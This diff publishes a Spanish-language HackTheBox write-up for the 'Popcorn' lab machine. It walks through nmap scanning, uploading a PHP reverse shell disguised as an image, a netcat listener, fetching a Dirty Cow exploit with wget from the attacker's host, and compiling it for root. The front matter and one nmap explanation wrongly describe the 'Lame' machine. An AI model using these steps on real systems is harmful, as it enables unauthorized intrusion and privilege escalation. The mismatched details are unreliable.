@@ -1,9 +1,171 @@
 ---
 title: Popcorn
-date: '2023-07-07'
+date: '2023-06-30'
 lastmod: '2023-08-05'
 tags: ['labs', 'HackTheBox']
-draft: true
+draft: false
 summary: 'Lame is a beginner-level machine that only requires one exploit to gain root access. It was the first machine published on Hack The Box and is often the first machine for new users.'
 images: ['/static/images/htb/lame/Lame.png']
 ---
+
+![Portada](/static/images/htb/popcorn/Popcorn.png)
+
+# [MIRA EL VIDEO TUTORIAL](https://youtu.be/xYD4cLwgwDw)
+
+<TOCInline toc={props.toc} exclude="Introduccion" />
+
+## RECONOCIMIENTO
+
+### Ping
+
+Primero, verificamos que estamos en la misma red que la máquina víctima enviando un paquete de datos a la dirección IP 10.10.10.6 usando el comando `ping`.
+
+```js
+ping -c 4 10.10.10.6
+```
+
+- `-c` : Número de paquetes de solicitud de eco ICMP (Protocolo de Mensajes de Control de Internet) que se enviarán.
+
+![Ping](/static/images/htb/popcorn/1.png)
+
+### Nmap
+
+A continuación, realizamos el escaneo de puertos.
+
+```js
+  nmap -p- --open 10.10.10.6 -Pn
+```
+
+- `-p-` : Escanea todos los puertos.
+- `--open` : Reporta solo los puertos que se encuentran abiertos.
+- `-Pn` : Realiza el escaneo incluso si el dispositivo no responde a los pings.
+
+![Ping](/static/images/htb/popcorn/2.png)
+
+Cuando obtenemos la lista de puertos abiertos en la máquina víctima, realizamos otro escaneo pero solo en aquellos reportados como abiertos por Nmap, incluyendo las siguientes opciones:
+
+- `-sC` : Activa el escaneo utilizando scripts de servicio y enumeración predeterminados. Los scripts se ejecutan contra los puertos abiertos para recopilar información adicional sobre los servicios en ejecución.
+- `-sV` : Realiza la detección de versiones de los servicios encontrados en los puertos abiertos. Nmap intenta determinar la versión y el tipo de servicio utilizando varios métodos, como enviar solicitudes específicas y comparar las respuestas recibidas.
+- `-p` : Especifica los puertos a escanear. En este caso, se escanean los puertos 21 (FTP), 22 (SSH), 139 (NetBIOS/SMB), 445 (SMB) y 3632 (distccd).
+- `-Pn` : Instruye a Nmap a realizar el escaneo incluso si el dispositivo no responde a los pings. Esto puede ser útil cuando el dispositivo tiene configuraciones de firewall que bloquean los paquetes de solicitud de eco ICMP.
+
+```js
+  nmap -sC -sV -p22,80 10.10.10.6 -Pn
+```
+
+![Ping](/static/images/htb/popcorn/3.png)
+
+### Puertos abiertos
+
+| Puertos abiertos | Servicio | Versión             |
+| ---------------- | -------- | ------------------- |
+| **_22/tcp_**     | ssh      | OpenSSH 5.1p1       |
+| **_80/tcp_**     | http     | Apache httpd 2.2.12 |
+
+## ENUMERACIÓN
+
+### Puerto 80 - http
+
+Realizamos fuzzing de directorios con ffuf.
+
+- `-w`: La lista de palabras que usaremos para el fuzzing.
+- `-u`: La URL contra la cual realizaremos el fuzzing.
+
+![Ping](/static/images/htb/popcorn/4.png)
+
+Y encontramos tres directorios: `test`, `torrent` y `rename`. El más útil en esta parte es `torrent`.
+
+Mientras enumeraba la página, encontré un falso positivo de SQLi en el formulario, lo que me permitió volcar toda la base de datos, pero sin encontrar nada útil.
+
+![Ping](/static/images/htb/popcorn/5.png)
+
+![Ping](/static/images/htb/popcorn/6.png)
+
+![Ping](/static/images/htb/popcorn/7.png)
+
+Hay una zona de carga de archivos, pero necesito registrarme para poder verla.
+![Ping](/static/images/htb/popcorn/8.png)
+
+Necesitamos subir un archivo torrent para que luego podamos editar la imagen que nos permitirá acceder al servidor.
+
+![Ping](/static/images/htb/popcorn/9.png)
+
+![Ping](/static/images/htb/popcorn/10.png)
+
+Tenemos la opción de editar la foto del torrent que subimos.
+![Ping](/static/images/htb/popcorn/11.png)
+
+![Ping](/static/images/htb/popcorn/12.png)
+
+Elegimos cualquier foto e interceptamos la solicitud para editarla.
+![Ping](/static/images/htb/popcorn/13.png)
+
+En este caso, utilizo la shell de pentest monkey.
+![Ping](/static/images/htb/popcorn/14.png)
+
+Elimino los metadatos de la foto y pego la shell, cambiando la IP y el puerto.
+La IP es la de la VPN, y el puerto es donde recibiremos la shell. En la shell, configuro el puerto 4444 para escuchar con:
+
+```js
+nc -lvnp 4444
+```
+
+![Ping](/static/images/htb/popcorn/15.png)
+
+![Ping](/static/images/htb/popcorn/16.png)
+
+Después de subir la shell, actualizamos la página y la abrimos en otra pestaña, luego vamos a `/torrent/upload` para activarla.
+![Ping](/static/images/htb/popcorn/29.png)
+
+![Ping](/static/images/htb/popcorn/30.png)
+
+Hacemos clic en nuestro archivo .php y recibiremos la shell en el puerto que está escuchando.
+![Ping](/static/images/htb/popcorn/17.png)
+
+Con acceso al servidor, encontramos el `user.txt` ubicado en el directorio del usuario George.
+![Ping](/static/images/htb/popcorn/18.png)
+
+![Ping](/static/images/htb/popcorn/19.png)
+
+## ROOT
+
+Comenzando con el reconocimiento, encontramos la versión del kernel, que es vulnerable a [Dirty Cow](https://en.wikipedia.org/wiki/Dirty_COW).
+
+```js
+uname - r
+```
+
+El comando `uname -r` se utiliza en sistemas operativos basados en Unix y Linux para mostrar la versión del [kernel](<https://en.wikipedia.org/wiki/Kernel_(operating_system)#:~:text=The%20kernel%20is%20a%20computer,mitigating%20conflicts%20between%20different%20processes.>) en uso.
+![Ping](/static/images/htb/popcorn/22.png)
+
+![Ping](/static/images/htb/popcorn/23.png)
+
+![Ping](/static/images/htb/popcorn/24.png)
+
+Descargamos el exploit a nuestra máquina y comenzamos un servidor con python, mientras que desde la máquina víctima lo descargamos con `wget`.
+
+```js
+wget http://IP_VPN:PORT/exploit.c
+```
+
+![Ping](/static/images/htb/popcorn/25.png)
+
+![Ping](/static/images/htb/popcorn/26.png)
+
+Para compilar un exploit en C:
+
+- `gcc`: Es el compilador GNU para el lenguaje de programación C. Se utiliza para compilar código fuente en C y convertirlo en un archivo ejecutable.
+
+- `-pthread`: Esta opción le dice al compilador que use la biblioteca de hilos POSIX (pthreads). Esto es útil si el programa utiliza hilos para realizar tareas concurrentes.
+
+- `dirty.c`: Este es el archivo que se va a compilar.
+
+- `-o dirty`: Esta opción le dice al compilador el nombre del archivo ejecutable de salida.
+
+- `-lcrypt`: Esta opción le dice al compilador que enlace el programa con la biblioteca `libcrypt`, que proporciona funciones de cifrado y descifrado.
+
+Entonces, el comando completo `gcc -pthread dirty.c -o dirty -lcrypt` compila el archivo `dirty.c` utilizando la biblioteca de hilos POSIX y la biblioteca de cifrado, produciendo un ejecutable llamado `dirty`. Después de eso, lo ejecutamos. Agregamos una contraseña al usuario `firefart` que se crea, y luego presionamos `CTRL + C` porque se cuelga.
+![Ping](/static/images/htb/popcorn/27.png)
+
+Cambiamos al usuario `firefart` y obtenemos privilegios de root.
+![Ping](/static/images/htb/popcorn/28.png)
